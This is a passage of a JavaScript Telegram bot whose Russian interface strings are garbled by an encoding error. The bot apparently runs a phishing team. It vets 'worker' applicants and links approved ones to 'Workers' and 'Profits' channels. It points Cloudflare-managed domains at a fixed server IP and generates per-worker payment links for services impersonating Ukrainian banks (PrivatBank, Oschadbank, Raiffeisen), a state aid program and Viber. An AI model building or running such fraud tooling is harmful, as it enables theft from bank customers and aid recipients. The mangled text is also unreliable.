                inline_keyboard: [[{ text: '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–Ω–æ–≤–∞', callback_data: `verify_domain_${domain}` }]],
              },
            })
          );
          console.log(`–î–æ–º–µ–Ω ${domain} –Ω–µ –∞–∫—Ç–∏–≤–µ–Ω, —Å—Ç–∞—Ç—É—Å: ${zone.result.status}`);
          return;
        }

        applications.domains = applications.domains || {};
        applications.domains[domain] = {
          ownerId: String(userId),
          ownerUsername: ctx.from.username || '–ù–µ—Ç –∏–º–µ–Ω–∏',
          addedAt: new Date().toISOString(),
          active: true,
          verified: true,
          nameservers,
        };
        saveApplications();

        // –õ–æ–≥ –≤—Å–µ—Ö DNS-–∑–∞–ø–∏—Å–µ–π –∑–æ–Ω—ã
        await logDnsRecords(zoneId, domain, ctx);

        await retryRequest(() =>
          ctx.reply(
            `–î–æ–º–µ–Ω ${domain} —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–≤—è–∑–∞–Ω!\n\n` +
            `A-–∑–∞–ø–∏—Å–∏ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã –Ω–∞ IP: ${ipAddress}.\n` +
            `NS-–∑–∞–ø–∏—Å–∏:\n` +
            nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
            `\n\n–î–æ–º–µ–Ω –≥–æ—Ç–æ–≤ –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –≤ —Å—Å—ã–ª–∫–∞—Ö.`
          )
        );
        console.log(`–î–æ–º–µ–Ω ${domain} —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–≤—è–∑–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º ${userId}`);
        delete domainState[userId];
        await ctx.answerCbQuery();
      } catch (error) {
        console.error(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–∏–≤—è–∑–∫–µ –¥–æ–º–µ–Ω–∞ ${domain}:`, error.message);
        await retryRequest(() =>
          ctx.reply(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–∏–≤—è–∑–∫–µ –¥–æ–º–µ–Ω–∞ ${domain}. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ DNS –∏–ª–∏ API-—Ç–æ–∫–µ–Ω.`, {
            reply_markup: {
              inline_keyboard: [[{ text: '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–Ω–æ–≤–∞', callback_data: `verify_domain_${domain}` }]],
            },
          })
        );
      }
      return;
    }

    
if (callbackData.startsWith('use_existing_zone_') && callbackData.endsWith('_manual')) {
  const domain = callbackData.replace('use_existing_zone_', '').replace('_manual','');
  if (!isAdminId(userId)) {
    await ctx.answerCbQuery('–ù–µ—Ç –ø—Ä–∞–≤.');
    return;
  }
  // –ò—â–µ–º –∑–æ–Ω—É –ø–æ –∏–º–µ–Ω–∏
  const zones = await cf.zones.list({ name: domain });
  if (!zones.result || !zones.result.length) {
    await ctx.reply(`‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –∑–æ–Ω—É –¥–ª—è ${domain}`);
    return;
  }
  const zoneId = zones.result[0].id;
  const nameservers = zones.result[0].name_servers;
  domainState[userId] = { domain, zoneId, nameservers, ipAddress: '45.130.41.157' };

  const ipAddress = '45.130.41.157'; // IP —Ö–æ—Å—Ç–∏–Ω–≥–∞ Beget
  try {
    for (const name of ['@', 'www', '*']) {
      await cf.dnsRecords.create(zoneId, {
        type: 'A',
        name: name === '@' ? domain : `${name}.${domain}`,
        content: ipAddress,
        ttl: 3600,
        proxied: true,
      });
    }
    console.log(`A-–∑–∞–ø–∏—Å–∏ –¥–ª—è ${domain} –¥–æ–±–∞–≤–ª–µ–Ω—ã –≤ —Å—É—â–µ—Å—Ç–≤—É—é—â—É—é –∑–æ–Ω—É (manual)`);
  } catch (error) {
    console.error(`–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è A-–∑–∞–ø–∏—Å–µ–π (manual) –¥–ª—è ${domain}:`, error.message);
  }

  await retryRequest(() =>
    ctx.reply(
      `–î–æ–º–µ–Ω ${domain} –ø—Ä–∏–≤—è–∑–∞–Ω –∫ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–π –∑–æ–Ω–µ!\n\n` +
      `–î–æ–±–∞–≤—å—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ NS-–∑–∞–ø–∏—Å–∏ —É –≤–∞—à–µ–≥–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ–º–µ–Ω–∞:\n` +
      nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
      `\n\nA-–∑–∞–ø–∏—Å–∏ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã –Ω–∞ IP: ${ipAddress}.\n` +
      `–ü–æ—Å–ª–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ NS-–∑–∞–ø–∏—Å–µ–π (–º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –¥–æ 24 —á–∞—Å–æ–≤) –Ω–∞–∂–º–∏—Ç–µ "–ü—Ä–æ–≤–µ—Ä–∏—Ç—å".`,
      { reply_markup: { inline_keyboard: [[{ text: '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å', callback_data: `verify_domain_${domain}` }]] } }
    )
  );
  await ctx.answerCbQuery();
  return;
}

    if (callbackData.startsWith('use_existing_zone_')) {
      const [domain, zoneId] = callbackData.replace('use_existing_zone_', '').split('_');
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('–ù–µ—Ç –ø—Ä–∞–≤.');
        return;
      }

      const nameservers = (await cf.zones.read(zoneId)).result.name_servers;
      domainState[userId] = { domain, zoneId, nameservers, ipAddress };

      // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ A-–∑–∞–ø–∏—Å–µ–π –¥–ª—è —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–π –∑–æ–Ω—ã
      const ipAddress = '45.130.41.157'; // IP —Ö–æ—Å—Ç–∏–Ω–≥–∞ Beget
      try {
        await cf.dnsRecords.create(zoneId, {
          type: 'A',
          name: 'www.' + domain,
          content: ipAddress,
          ttl: 3600,
          proxied: true,
        });
        await cf.dnsRecords.create(zoneId, {
          type: 'A',
          name: domain,
          content: ipAddress,
          ttl: 3600,
          proxied: true,
        });
        await cf.dnsRecords.create(zoneId, {
          type: 'A',
          name: '*.' + domain,
          content: ipAddress,
          ttl: 3600,
          proxied: true,
        });
        console.log(`A-–∑–∞–ø–∏—Å–∏ –¥–ª—è ${domain} –¥–æ–±–∞–≤–ª–µ–Ω—ã –≤ —Å—É—â–µ—Å—Ç–≤—É—é—â—É—é –∑–æ–Ω—É`);
      } catch (error) {
        console.error(`–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è A-–∑–∞–ø–∏—Å–µ–π –¥–ª—è ${domain}:`, error.message);
      }

      await retryRequest(() =>
        ctx.reply(
          `–î–æ–º–µ–Ω ${domain} –ø—Ä–∏–≤—è–∑–∞–Ω –∫ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–π –∑–æ–Ω–µ!\n\n` +
          `–î–æ–±–∞–≤—å—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ NS-–∑–∞–ø–∏—Å–∏ —É –≤–∞—à–µ–≥–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ–º–µ–Ω–∞:\n` +
          nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
          `\n\nA-–∑–∞–ø–∏—Å–∏ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã –Ω–∞ IP: ${ipAddress}.\n` +
          `–ü–æ—Å–ª–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ NS-–∑–∞–ø–∏—Å–µ–π (–º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –¥–æ 24 —á–∞—Å–æ–≤) –Ω–∞–∂–º–∏—Ç–µ "–ü—Ä–æ–≤–µ—Ä–∏—Ç—å".`,
          {
            reply_markup: {
              inline_keyboard: [[{ text: '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å', callback_data: `verify_domain_${domain}` }]],
            },
          }
        )
      );
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData === 'manage_admins') {
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('–ù–µ—Ç –ø—Ä–∞–≤.');
        return;
      }
      const userButtons = buildAdminKeyboard();
      await retryRequest(() =>
        ctx.reply('–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏:', {
          reply_markup: { inline_keyboard: userButtons },
        })
      );
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData.startsWith('toggle_admin_')) {
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('–ù–µ—Ç –ø—Ä–∞–≤.');
        return;
      }

      const targetId = Number(callbackData.replace('toggle_admin_', ''));
      if (!applications[targetId]) {
        await ctx.answerCbQuery('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –∑–∞—è–≤–∫–∞—Ö.');
        return;
      }

      const uniqueToken = crypto.randomBytes(8).toString('hex');
      const callbackKey = `${chatId}_${messageId}_${targetId}_${uniqueToken}`;
      console.log(`[toggle_admin] –û–±—Ä–∞–±–æ—Ç–∫–∞ callback: ${callbackKey}`);
      if (!addToCallbackCache(callbackKey)) {
        console.log(`[toggle_admin] –î—É–±–ª–∏–∫–∞—Ç –æ—Ç–∫–ª–æ–Ω—ë–Ω: ${callbackKey}`);
        await ctx.answerCbQuery('–î–µ–π—Å—Ç–≤–∏–µ —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è, –ø–æ–¥–æ–∂–¥–∏—Ç–µ.');
        return;
      }

      const isCurrentlyAdmin = applications[targetId].admin === true;
      applications[targetId].admin = !isCurrentlyAdmin;
      saveApplications();

      const userButtons = buildAdminKeyboard();
      try {
        await retryRequest(() =>
          ctx.editMessageText('–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏:', {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: { inline_keyboard: userButtons },
          })
        );
        console.log(`[toggle_admin] –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞ –¥–ª—è ${targetId}, admin: ${applications[targetId].admin}`);
      } catch (error) {
        console.error(`[toggle_admin] –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è ${targetId}:`, error.message);
        await retryRequest(() =>
          ctx.reply('–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏:', {
            reply_markup: { inline_keyboard: userButtons },
          })
        );
        console.log(`[toggle_admin] –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è ${targetId}`);
      }

      const uname = applications[targetId]?.username ? `@${applications[targetId].username}` : targetId;
      console.log(`[toggle_admin] –°—Ç–∞—Ç—É—Å –∞–¥–º–∏–Ω–∞ –¥–ª—è ${uname} (${targetId}) –∏–∑–º–µ–Ω—ë–Ω. Admin: ${applications[targetId].admin}, by ${userId}`);
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_')) {
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('–ù–µ—Ç –ø—Ä–∞–≤.');
        return;
      }

      const [action, targetUserId] = callbackData.split('_');
      const adminChatId = ADMIN_CHAT_ID;
      const adminUsername = ctx.from.username || '–ê–¥–º–∏–Ω';

      console.log(`–û–±—Ä–∞–±–æ—Ç–∫–∞ ${action} –¥–ª—è userId: ${targetUserId}, adminChatId: ${adminChatId}, messageId: ${messageId}`);

      if (!adminChatId) {
        console.error('ADMIN_CHAT_ID –Ω–µ —É–∫–∞–∑–∞–Ω –≤ .env');
        await ctx.answerCbQuery('–û—à–∏–±–∫–∞: ADMIN_CHAT_ID –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω.');
        return;
      }

      if (!applications[targetUserId]) {
        console.log(`–ó–∞—è–≤–∫–∞ –¥–ª—è ${targetUserId} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –≤ applications`);
        await ctx.answerCbQuery('–ó–∞—è–≤–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.');
        return;
      }

      if (!applications[targetUserId].messageId) {
        console.log(`messageId –¥–ª—è ${targetUserId} –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ applications`);
        await ctx.answerCbQuery('–û—à–∏–±–∫–∞: —Å–æ–æ–±—â–µ–Ω–∏–µ –∑–∞—è–≤–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.');
        return;
      }

      const originalText =
        `–ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ –æ—Ç @${applications[targetUserId].username} ` +
        `(${applications[targetUserId].firstName} ${applications[targetUserId].lastName}):\n` +
        `${applications[targetUserId].message}`;

      let buttonText;

      console.log(`–ü–æ–ø—ã—Ç–∫–∞ –≤—ã–ø–æ–ª–Ω–∏—Ç—å ${action} –¥–ª—è ${targetUserId}`);

      if (action === 'approve') {
        applications[targetUserId].status = 'approved';
        buttonText = `–û–¥–æ–±—Ä–∏–ª - @${adminUsername}`;
        try {
          await retryRequest(() =>
            bot.telegram.sendMessage(Number(targetUserId), '–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –æ–¥–æ–±—Ä–µ–Ω–∞!', {
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: '–í–æ—Ä–∫–µ—Ä—ã', url: 'https://t.me/+neejzwlpAbo1MjZi' },
                    { text: '–ü—Ä–æ—Ñ–∏—Ç—ã', url: 'https://t.me/+o9Kpn9RDIMExOWNi' },
                  ],
                ],
              },
            })
          );
          console.log(`–ó–∞—è–≤–∫–∞ ${targetUserId} –æ–¥–æ–±—Ä–µ–Ω–∞, —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ`);
        } catch (error) {
          console.error(`–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è ${targetUserId}:`, error.message, error.stack);
          await ctx.answerCbQuery('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é.');
          return;
        }
      } else if (action === 'reject') {
        applications[targetUserId].status = 'rejected';
        buttonText = `–û—Ç–∫–ª–æ–Ω–∏–ª - @${adminUsername}`;
        try {
          await retryRequest(() =>
            bot.telegram.sendMessage(Number(targetUserId), '–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞.')
          );
          console.log(`–ó–∞—è–≤–∫–∞ ${targetUserId} –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞, —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ`);
        } catch (error) {
          console.error(`–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è ${targetUserId}:`, error.message, error.stack);
          await ctx.answerCbQuery('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é.');
          return;
        }
      }

      try {
        await retryRequest(() =>
          bot.telegram.editMessageText(adminChatId, applications[targetUserId].messageId, undefined, originalText, {
            reply_markup: {
              inline_keyboard: [[{ text: buttonText, callback_data: 'noop' }]],
            },
          })
        );
        console.log(`–°–æ–æ–±—â–µ–Ω–∏–µ –≤ –∞–¥–º–∏–Ω-—á–∞—Ç–µ –æ–±–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è ${targetUserId}, action: ${action}`);
      } catch (error) {
        console.error(`–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è –≤ –∞–¥–º–∏–Ω-—á–∞—Ç–µ –¥–ª—è ${targetUserId}:`, error.message, error.stack);
        await ctx.answerCbQuery('–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è –≤ –∞–¥–º–∏–Ω-—á–∞—Ç–µ.');
      }

      saveApplications();
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData.startsWith('service_')) {
      const serviceMap = {
        'service_dopomoga': '–î–æ–ø–æ–º–æ–≥–∞',
        'service_raif': '–†–∞–π—Ñ',
        'service_oshchad': '–û—â–∞–¥',
        'service_privat': '–ü—Ä–∏–≤–∞—Ç',
        'service_viber': '–í–∞–π–±–µ—Ä',
      };
      const serviceKey = callbackData;
      const service = serviceMap[serviceKey];

      if (!service) {
        console.error(`–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Å–µ—Ä–≤–∏—Å: ${serviceKey}`);
        await ctx.answerCbQuery('–û—à–∏–±–∫–∞: —Å–µ—Ä–≤–∏—Å –Ω–µ –Ω–∞–π–¥–µ–Ω.');
        return;
      }

      userState[userId] = { awaitingAmount: true, service };
      await retryRequest(() =>
        ctx.reply('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É:', {
          reply_markup: {
            inline_keyboard: [[{ text: '–û—Ç–º–µ–Ω–∞', callback_data: 'cancel_amount' }]],
          },
        })
      );
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData === 'cancel_amount') {
      delete userState[userId];
      await ctx.reply('–í–≤–æ–¥ —Å—É–º–º—ã –æ—Ç–º–µ–Ω–µ–Ω.');
      await ctx.answerCbQuery();
      return;
    }

  } catch (error) {
    console.error(`–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ callback ${callbackData}:`, error.message, error.stack);
    await ctx.answerCbQuery('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.');
  }
});

/* ==========================
   11) –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ —Å—É–º–º—ã
========================== */
bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const messageText = ctx.message.text;

  if (userState[userId]?.awaitingAmount) {
    const amount = parseFloat(messageText);
    if (isNaN(amount) || amount <= 0) {
      await retryRequest(() =>
        ctx.reply('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—É–º–º—É (–ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ).', {
          reply_markup: {
            inline_keyboard: [[{ text: '–û—Ç–º–µ–Ω–∞', callback_data: 'cancel_amount' }]],
          },
        })
      );
      console.log(`–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —Å—É–º–º–∞ –æ—Ç ${userId}: ${messageText}`);
      return;
    }

    const { service } = userState[userId];
    const link = generateLink(service, amount, userId);

    applications[userId] = applications[userId] || {};
    applications[userId].links = applications[userId].links || [];
    applications[userId].links.push({ service, amount, link, timestamp: new Date().toISOString() });
    saveApplications();

    await retryRequest(() => ctx.reply(`–í–∞—à–∞ —Å—Å—ã–ª–∫–∞: ${link}`));
    console.log(`–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞ –¥–ª—è ${userId}: ${link}`);
    delete userState[userId];
    return;
  }

  await handleTextMessage(ctx);
});

/* ==========================
   12) –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã "–ú–æ–∏ —Å—Å—ã–ª–∫–∏"
========================== */
bot.hears('–ú–æ–∏ —Å—Å—ã–ª–∫–∏', async (ctx) => {
  const userId = ctx.from.id;
  if (!applications[userId] || applications[userId].status !== 'approved') {
    return ctx.reply('–£ –≤–∞—Å –Ω–µ—Ç –æ–¥–æ–±—Ä–µ–Ω–Ω—ã—Ö –∑–∞—è–≤–æ–∫ –∏–ª–∏ —Å—Å—ã–ª–æ–∫.');
  }

  const links = applications[userId].links || [];
  if (!links.length) {
    return ctx.reply('–£ –≤–∞—Å –ø–æ–∫–∞ –Ω–µ—Ç —Å—Å—ã–ª–æ–∫.');
  }

  const linksText = links
    .map((link, index) => `${index + 1}. ${link.service} - ${link.amount} - ${link.link} (${link.timestamp})`)
    .join('\n');
  await ctx.reply(`–í–∞—à–∏ —Å—Å—ã–ª–∫–∏:\n${linksText}`);
});

/* ==========================
   13) –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã "–í—ã–±—Ä–∞—Ç—å —Å–µ—Ä–≤–∏—Å"
========================== */
bot.hears('–í—ã–±—Ä–∞—Ç—å —Å–µ—Ä–≤–∏—Å', async (ctx) => {
  const userId = ctx.from.id;
  if (!applications[userId] || applications[userId].status !== 'approved') {
    return ctx.reply('–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –Ω–µ –æ–¥–æ–±—Ä–µ–Ω–∞. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∑–∞—è–≤–∫—É —á–µ—Ä–µ–∑ /start.');
  }
  showServices(ctx);
});

/* ==========================
   14) –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
========================== */
bot.launch().then(() => {
  console.log('–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω');
}).catch((error) => {
  console.error('–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞:', error.message, error.stack);
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));